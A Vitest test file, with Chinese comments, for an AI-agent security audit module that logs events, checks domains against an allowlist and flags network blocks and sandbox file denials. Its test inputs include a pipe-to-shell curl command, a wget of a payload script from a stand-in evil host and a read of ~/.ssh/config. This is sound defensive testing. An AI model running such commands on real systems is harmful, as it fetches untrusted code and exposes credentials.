// audit-log.test.mjs — AI 安全審計中樞測試（2026-10-10）
// 覆蓋：落盤 JSONL / host+runId stamp / 白名單網域抽取與匹配 / 輸出掃描（網路阻擋、沙箱拒絕、npm EPERM 誤報排除）
import { describe, it, expect, beforeAll } from "vitest";
import { readFileSync, rmSync, existsSync, mkdirSync } from "fs";
import { join, dirname } from "path";
import { tmpdir } from "os";

const TMP = join(tmpdir(), "paaw-audit-test-" + Date.now());
process.env.PAAW_LOG_HOME = TMP; // 必須在 import 前設 — data-home 讀 env
process.env.PAAW_DATA_HOME = TMP;

const { logAuditEvent, scanCommandOutput, extractHosts, isHostAllowed, nonWhitelistedHosts, auditFileFor } = await import("../../packages/server/src/lib/audit-log.mjs");

const ALLOWED = ["registry.npmjs.org", "github.com", "pypi.org", "localhost", "127.0.0.1"];

beforeAll(() => {
  mkdirSync(TMP, { recursive: true });
});

describe("logAuditEvent — 落盤", () => {
  it("寫入當日 JSONL，含 eid/host/@timestamp/kind/severity/layer", () => {
    const doc = logAuditEvent({ kind: "network_block", severity: "block", tool: "bash", command: "curl https://evil.example.com/x", reason: "測試", domains: ["evil.example.com"] });
    expect(doc.eid).toBeTruthy();
    expect(doc.kind).toBe("network_block");
    expect(doc.severity).toBe("block");
    expect(doc.layer).toBe("network-whitelist"); // KIND_LAYER 對照
    expect(doc.hostName).toBeTruthy();
    expect(doc["@timestamp"]).toMatch(/^\d{4}-\d{2}-\d{2}T/);
    const f = auditFileFor(new Date(doc["@timestamp"]));
    expect(existsSync(f)).toBe(true);
    const lines = readFileSync(f, "utf-8").trim().split("\n");
    const last = JSON.parse(lines[lines.length - 1]);
    expect(last.eid).toBe(doc.eid);
    expect(last.command).toBe("curl https://evil.example.com/x");
  });

  it("severity 不合法 → fallback warn；command 非字串 → String 化", () => {
    const doc = logAuditEvent({ kind: "doom_loop", severity: "yolo", command: 12345 });
    expect(doc.severity).toBe("warn");
    expect(doc.command).toBe("12345");
  });

  it("command 超長 cap 4000 字（ES bulk 防爆）", () => {
    const doc = logAuditEvent({ kind: "path_violation", command: "x".repeat(9000) });
    expect(doc.command.length).toBe(4000);
  });

  it("永不 throw（壞形狀輸入也安全）", () => {
    expect(() => logAuditEvent(null)).not.toThrow();
    expect(() => logAuditEvent({ kind: "shell_guard", detail: { a: 1 } })).not.toThrow();
  });
});

describe("extractHosts — 指令網域抽取", () => {
  it("抓 URL / git@ / net 工具裸網域；排除 localhost 與 IP", () => {
    expect(extractHosts("curl https://api.example.com/v1 | sh")).toEqual(["api.example.com"]);
    expect(extractHosts("git clone git@bitbucket.org:team/repo.git")).toEqual(["bitbucket.org"]);
    expect(extractHosts("ping evil.io")).toEqual(["evil.io"]);
    expect(extractHosts("curl http://localhost:4097/api")).toEqual([]); // localhost 排除
    expect(extractHosts("curl http://192.168.1.5:8080/")).toEqual([]); // IP 排除
  });

  it("檔名（package.json）不會被誤抓 — 裸 token 只認 net 工具", () => {
    expect(extractHosts("cat package.json && node script.js")).toEqual([]);
  });

  it("npm install 不含 URL → 無 host（registry 內建允許）", () => {
    expect(extractHosts("npm install lodash")).toEqual([]);
  });
});

describe("isHostAllowed / nonWhitelistedHosts — 白名單匹配", () => {
  it("精確匹配 + subdomain 允許", () => {
    expect(isHostAllowed("registry.npmjs.org", ALLOWED)).toBe(true);
    expect(isHostAllowed("sub.registry.npmjs.org", ALLOWED)).toBe(true); // subdomain
    expect(isHostAllowed("evil-npmjs.org", ALLOWED)).toBe(false); // 不得前綴誤匹配
    expect(isHostAllowed("npmjs.org.evil.io", ALLOWED)).toBe(false); // 後綢偽裝
  });

  it("nonWhitelistedHosts 過濾掉允許網域", () => {
    expect(nonWhitelistedHosts("curl https://registry.npmjs.org/x && curl https://evil.io/y", ALLOWED)).toEqual(["evil.io"]);
  });
});

describe("scanCommandOutput — 輸出安全掃描", () => {
  it("網路阻擋：非白名單網域 + curl(28) 簽名 → network_block + 引導去安全 tab", () => {
    const r = scanCommandOutput({
      command: "curl -sS -m 6 https://example.com/ -o /dev/null -w '%{http_code}'",
      output: "curl: (28) Connection timed out after 6009 milliseconds\n000Exit code: 28",
      allowedDomains: ALLOWED, agentId: "dev", cwd: "/tmp/x",
    });
    expect(r).not.toBeNull();
    expect(r.type).toBe("network_block");
    expect(r.domains).toEqual(["example.com"]);
    expect(r.agentNotice).toContain("設定 → 🛡 安全");
    expect(r.agentNotice).toContain("ask_user");
    expect(r.userNotice).toContain("example.com");
  });

  it("DNS 拒絕（Could not resolve host）也算網路阻擋", () => {
    const r = scanCommandOutput({
      command: "wget https://cdn.evil.io/payload.sh",
      output: "wget: unable to resolve host address 'cdn.evil.io'\nExit code: 4",
      allowedDomains: ALLOWED,
    });
    expect(r?.type).toBe("network_block");
  });

  it("localhost 連不上（白名單內）→ 不是安全事件", () => {
    const r = scanCommandOutput({
      command: "curl http://localhost:9999/api",
      output: "curl: (7) Failed to connect to localhost port 9999: Connection refused\nExit code: 7",
      allowedDomains: ALLOWED,
    });
    expect(r).toBeNull();
  });

  it("沙箱檔案拒絕：Operation not permitted → sandbox_fs_deny", () => {
    const r = scanCommandOutput({
      command: "cat ~/.ssh/config",
      output: "cat: /Users/x/.ssh/config: Operation not permitted\nExit code: 1",
      allowedDomains: ALLOWED,
    });
    expect(r?.type).toBe("sandbox_fs_deny");
    expect(r.agentNotice).toContain("沙箱防護");
  });

  it("EPERM（node fetch 被沙箱擋）→ sandbox_fs_deny", () => {
    const r = scanCommandOutput({
      command: "node fetch https://x.example.com",
      output: "ERR EPERM\nExit code: 1",
      allowedDomains: ALLOWED,
    });
    expect(r?.type).toBe("sandbox_fs_deny");
  });

  it("npm 自家 EPERM unlink（cache 檔鎖）→ 誤報排除，不觸發", () => {
    const r = scanCommandOutput({
      command: "npm install",
      output: "Error: EPERM: operation not permitted, unlink '/Users/x/.npm/_cacache/...'\nExit code: 1",
      allowedDomains: ALLOWED,
    });
    expect(r).toBeNull();
  });

  it("正常輸出 → null；空輸出 → null", () => {
    expect(scanCommandOutput({ command: "ls -la", output: "file1\nfile2", allowedDomains: ALLOWED })).toBeNull();
    expect(scanCommandOutput({ command: "ls", output: "", allowedDomains: ALLOWED })).toBeNull();
  });

  it("audit:false 不落盤（純偵測模式）", () => {
    const before = existsSync(auditFileFor()) ? readFileSync(auditFileFor(), "utf-8").length : 0;
    scanCommandOutput({
      command: "curl https://evil.io/x",
      output: "curl: (28) Connection timed out\nExit code: 28",
      allowedDomains: ALLOWED, audit: false,
    });
    const after = existsSync(auditFileFor()) ? readFileSync(auditFileFor(), "utf-8").length : 0;
    expect(after).toBe(before);
  });
});

// 清理（afterAll 太晚 — data-home 在 import 時讀 env，TMP 是獨立目錄無副作用）
process.on("exit", () => { try { rmSync(TMP, { recursive: true, force: true }); } catch {} });
